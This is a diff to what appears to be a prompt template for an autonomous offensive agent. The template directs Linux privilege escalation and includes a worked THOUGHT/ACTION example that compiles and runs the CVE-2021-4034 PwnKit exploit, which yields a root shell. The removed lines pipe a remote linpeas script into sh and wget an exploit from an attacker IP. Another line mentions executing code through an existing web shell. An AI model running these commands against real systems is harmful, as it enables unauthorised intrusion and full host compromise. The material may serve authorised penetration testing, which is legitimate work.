@@ -1682,7 +1682,7 @@ Run ALL applicable checks in this exact order (most reliable first):
    id; whoami; uname -a; cat /etc/os-release; sudo -l
 
 2. Automated enumeration:
-   curl -s https://linpeas.sh | sh > /tmp/linpeas.txt (if internet available)
+   bash ~/CyberAgent/tools/linpeas.sh > /tmp/linpeas.txt
    OR: upload linpeas.sh via existing web shell, execute, capture output
 
 3. SUID files (high reliability):
@@ -1894,7 +1894,7 @@ ii  policykit-1 0.105-31 amd64 framework for managing administrative policies an
 
 THOUGHT: polkit confirmed installed. Upload and compile CVE-2021-4034 PwnKit PoC.
 
-ACTION: run in shell: cd /tmp && wget -q http://192.168.1.100:8000/pwnkit.c && gcc -o pwnkit pwnkit.c && ./pwnkit
+ACTION: run in shell: cd /tmp && gcc -o pwnkit ~/CyberAgent/tools/pwnkit.c && ./pwnkit
 
 OBSERVATION:
 # id
@@ -1913,7 +1913,7 @@ OUTPUT:
   ],
   "successful_technique": {{
     "technique": "CVE-2021-4034 PwnKit polkit pkexec SUID exploit",
-    "command": "cd /tmp && wget http://192.168.1.100:8000/pwnkit.c && gcc -o pwnkit pwnkit.c && ./pwnkit",
+    "command": "cd /tmp && gcc -o pwnkit ~/CyberAgent/tools/pwnkit.c && ./pwnkit",
     "cve": "CVE-2021-4034",
     "gtfobins_entry": null,
     "mitre_id": "T1068",
